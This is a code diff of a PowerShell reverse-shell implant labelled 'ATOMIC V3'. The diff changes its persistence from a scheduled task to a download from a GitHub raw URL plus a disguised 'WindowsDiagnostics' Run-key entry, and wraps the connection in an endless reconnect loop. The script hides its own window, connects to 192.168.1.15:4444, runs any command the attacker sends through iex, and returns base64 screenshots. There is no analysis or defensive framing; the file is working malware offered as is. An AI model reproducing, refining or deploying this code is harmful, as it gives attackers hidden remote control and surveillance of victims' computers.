@@ -1,18 +1,15 @@
 # --- CONFIG ---
 $ip = '192.168.1.15'
 $port = 4444
-$taskName = "WinNetDiagnostic"
+$url = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1'
 $installPath = "$env:APPDATA\win_diag.ps1"
 
-# --- 1. PERSISTENCE CHECK & INSTALL ---
-if ($PSCommandPath -ne $installPath) {
-    Copy-Item -Path $PSCommandPath -Destination $installPath -Force
-    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -f `"$installPath`""
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
-        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Force
-    }
+# --- 1. FIX: MANUAL INSTALL (Since $PSCommandPath is empty in IEX) ---
+if (!(Test-Path $installPath)) {
+    (New-Object Net.WebClient).DownloadFile($url, $installPath)
+    # User-Level Persistence (No Admin Required)
+    $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    Set-ItemProperty -Path $key -Name "WindowsDiagnostics" -Value "powershell.exe -w hidden -nop -f `"$installPath`""
 }
 
 # --- 2. INSTANT WINDOW HIDE ---
@@ -21,21 +18,21 @@ $win = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Util" -PassThr
 $hwnd = (Get-Process -Id $PID).MainWindowHandle
 if ($hwnd -ne 0) { $win::ShowWindow($hwnd, 0) }
 
-# --- 3. CORE CONNECTION ---
-try {
-    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
-    $s = $c.GetStream(); $r = New-Object System.IO.StreamReader($s); $w = New-Object System.IO.StreamWriter($s)
-    $w.AutoFlush = $true
-    $w.WriteLine("--- ATOMIC V3 ACCESS: $env:COMPUTERNAME ($env:USERNAME) ---")
+# --- 3. CORE CONNECTION LOOP ---
+while($true) {
+    try {
+        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $s = $c.GetStream(); $r = New-Object System.IO.StreamReader($s); $w = New-Object System.IO.StreamWriter($s)
+        $w.AutoFlush = $true
+        $w.WriteLine("--- ATOMIC V3.1 GRANTED: $env:COMPUTERNAME ---")
 
-    while($c.Connected) {
-        $w.Write("PS " + (Get-Location).Path + "> ")
-        $raw = $r.ReadLine()
-        if ($null -eq $raw -or $raw -eq "exit") { break }
+        while($c.Connected) {
+            $w.Write("PS " + (Get-Location).Path + "> ")
+            $line = $r.ReadLine()
+            if ($null -eq $line -or $line -eq "exit") { break }
 
-        # --- BRANCHING LOGIC ---
-        if ($raw.Trim() -eq "screenshot") {
-            try {
+            if ($line.Trim() -eq "screenshot") {
+                # 
                 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                 $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
@@ -45,18 +42,15 @@ try {
                 $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                 $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                 $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
-            } catch { $w.WriteLine("Screenshot Failed: $($_.Exception.Message)") }
-        } 
-        else {
-            # Execute command and catch errors so shell doesn't die
-            $out = try { iex $raw 2>&1 | Out-String } catch { $_.Exception.Message }
-            $w.WriteLine($out)
+            } 
+            else {
+                $out = try { iex $line 2>&1 | Out-String } catch { $_.Exception.Message }
+                $w.WriteLine($out)
+            }
         }
+    } catch { 
+        Start-Sleep -Seconds 30 # Retry connection if it drops
+    } finally {
+        if ($c) { $c.Close() }
     }
-} catch {
-    # If connection fails, wait 30s and try again (Infinite loop for persistence)
-    Start-Sleep -Seconds 30
-    & $PSCommandPath
-} finally {
-    if ($c) { $c.Close() }
 }
